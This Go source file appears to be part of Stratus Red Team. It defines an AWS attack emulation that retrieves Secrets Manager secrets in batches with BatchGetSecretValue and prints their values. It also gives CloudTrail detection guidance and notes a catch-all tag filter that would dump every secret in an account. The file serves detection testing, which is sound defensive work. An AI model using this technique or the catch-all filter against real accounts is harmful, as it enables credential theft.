package aws

import (
	"context"
	_ "embed"
	"errors"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/secretsmanager"
	"github.com/aws/aws-sdk-go-v2/service/secretsmanager/types"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"strconv"
)

//go:embed main.tf
var tf []byte

const code = "```"

// BatchSize how many secrets to retrieve per call
// default value is 10 - the max value is 20
// we stick to 10 to generate more BatchGetSecretValue calls without the need for too many actual secrets
const BatchSize = 10

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.credential-access.secretsmanager-batch-retrieve-secrets",
		FriendlyName: "Retrieve a High Number of Secrets Manager secrets (Batch)",
		Description: `
Retrieves a high number of Secrets Manager secrets by batch, through <code>secretsmanager:BatchGetSecretValue</code> (released Novemeber 2023). 
An attacker may attempt to retrieve a high number of secrets by batch, to avoid detection and generate fewer calls. Note that the batch size is limited to 20 secrets.


Warm-up: 

- Create multiple secrets in Secrets Manager.

Detonation: 

- Dump all secrets by batch of ` + strconv.Itoa(BatchSize) + `, using <code>secretsmanager:BatchGetSecretValue</code>.

References:

- https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud
- https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud/
- https://aws.amazon.com/blogs/security/how-to-use-the-batchgetsecretsvalue-api-to-improve-your-client-side-applications-with-aws-secrets-manager/
`,
		Detection: `
Identify principals that attempt to retrieve secrets by batch, through CloudTrail's <code>BatchGetSecretValue</code> event. Sample event:

` + code + `json
{
  "eventSource": "secretsmanager.amazonaws.com",
  "eventName": "BatchGetSecretValue",
  "requestParameters": {
    "filters": [
      {
        "key": "tag-key",
        "values": [
          "StratusRedTeam"
        ]
      }
    ]
  },
  "responseElements": null,
  "readOnly": true,
  "eventType": "AwsApiCall",
  "managementEvent": true,
  "recipientAccountId": "012345678901"
}
` + code + `

Although <code>BatchGetSecretValue</code> requires a list of secret IDs or a filter, an attacker may use a catch-all filter to retrieve all secrets by batch:

` + code + `json hl_lines="6-11"
{
  "eventSource": "secretsmanager.amazonaws.com",
  "eventName": "BatchGetSecretValue",
  "requestParameters": {
    "filters": [
      {
        "key": "tag-key",
        "values": [
          "!tagKeyThatWillNeverExist"
        ]
      }
    ]
  },
  "responseElements": null,
  "readOnly": true,
  "eventType": "AwsApiCall",
  "managementEvent": true,
  "recipientAccountId": "012345678901"
}
` + code + `

The following may be use to tune the detection, or validate findings:

- Principals who do not usually call GetBatchSecretValue
- Attempts to call GetBatchSecretValue resulting in access denied errors
- Principals calling GetBatchSecretValue in several regions in a short period of time`,
		Platform:                   stratus.AWS,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.CredentialAccess},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(_ map[string]string, providers stratus.CloudProviders) error {
	secretsManagerClient := secretsmanager.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Retrieving secrets by batch of " + strconv.Itoa(BatchSize) + " using BatchGetSecretValue...")
	paginator := secretsmanager.NewBatchGetSecretValuePaginator(secretsManagerClient, &secretsmanager.BatchGetSecretValueInput{
		Filters: []types.Filter{
			{Key: types.FilterNameStringTypeTagKey, Values: []string{"StratusRedTeam"}},
			// note: you could use the filter below to dump all secrets by batch
			// {Key: types.FilterNameStringTypeTagKey, Values: []string{"!iwillprobablyneverexist"}},
		},
		MaxResults: aws.Int32(BatchSize),
	})

	for paginator.HasMorePages() {
		batchSecretsResponse, err := paginator.NextPage(context.Background())
		if err != nil {
			return errors.New("unable to call BatchGetSecretValue: " + err.Error())
		}

		log.Println("Successfully retrieved a batch of " + strconv.Itoa(len(batchSecretsResponse.SecretValues)) + " secrets")
		for _, secret := range batchSecretsResponse.SecretValues {
			fmt.Println("\t" + *secret.Name + " = " + *secret.SecretString)
		}
	}

	return nil
}
